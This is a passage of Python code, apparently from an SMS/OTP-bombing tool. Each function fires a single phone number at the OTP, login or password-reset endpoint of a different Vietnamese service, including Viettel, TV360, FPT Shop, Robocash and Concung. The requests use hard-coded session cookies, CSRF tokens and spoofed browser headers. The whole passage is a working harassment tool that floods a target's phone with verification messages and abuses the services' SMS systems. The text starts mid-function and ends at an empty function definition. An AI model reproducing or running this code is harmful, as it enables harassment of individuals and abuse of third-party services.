    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text
def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text
    
def apitv360(phone):
 requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
def momo(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def sv(phone):
  cookies = {
        '_ga': 'GA1.2.1651025600.1692762277',
  '_gid': 'GA1.2.215967924.1692762277',
  '_ga_9B0FYPSWN9': 'GS1.2.1692769369.2.0.1692769369.60.0.0',
  'serverChoice': 'Server-IPv2',
    }
  headers = {
        'authority': 'xuandungshortcuts.000webhostapp.com',
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'cache-control': 'max-age=0',
  'content-type': 'application/x-www-form-urlencoded',
  # 'cookie': '_ga=GA1.2.1651025600.1692762277; _gid=GA1.2.215967924.1692762277; _ga_9B0FYPSWN9=GS1.2.1692769369.2.0.1692769369.60.0.0; serverChoice=Server-IPv2',
  'origin': 'https://xuandungshortcuts.000webhostapp.com',
  'referer': 'https://xuandungshortcuts.000webhostapp.com/',
  'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'document',
  'sec-fetch-mode': 'navigate',
  'sec-fetch-site': 'same-origin',
  'sec-fetch-user': '?1',
  'upgrade-insecure-requests': '1',
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
  data = {
    'phone': phone,
  'ten_server': 'Server-IPv2',
  'key': 'modmobile',
}

  response = requests.post('https://xuandungshortcuts.000webhostapp.com/', cookies=cookies, headers=headers, data=data)
def fpt(phone):
    requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
    
def call3(phone):
    requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text

def call2(phone):
    requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
    
def call1(phone):
    requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone[1:11]})).text

def call4(phone):
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
    
def call5(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)

def call9(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)
     
def concung(phone):
    Headers = {"Host": "concung.com","content-length": "121","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://concung.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://concung.com/dang-nhap.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_BBD6001M29\u003dGS1.1.1679234342.1.1.1679234352.50.0.0"}
    Payload = {"ajax": "1","classAjax": "AjaxLogin","methodAjax": "sendOtpLogin","customer_phone": phone,"id_customer": "0","momoapp": "0","back": "khach-hang.html"}
    response = requests.post("https://concung.com/ajax.html", data=Payload, headers=Headers)

def cafeland(phone):
    Headers = {"Host": "nhadat.cafeland.vn","content-length": "65","accept": "application/json, text/javascript, */*; q\u003d0.01","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://nhadat.cafeland.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://nhadat.cafeland.vn/dang-ky.html","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "laravel_session\u003deyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D"}
    Payload = {"mobile": phone,"_token": "bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w",}
    response = requests.post("https://nhadat.cafeland.vn/member-send-otp/", data=Payload, headers=Headers)

def moneydong(phone):
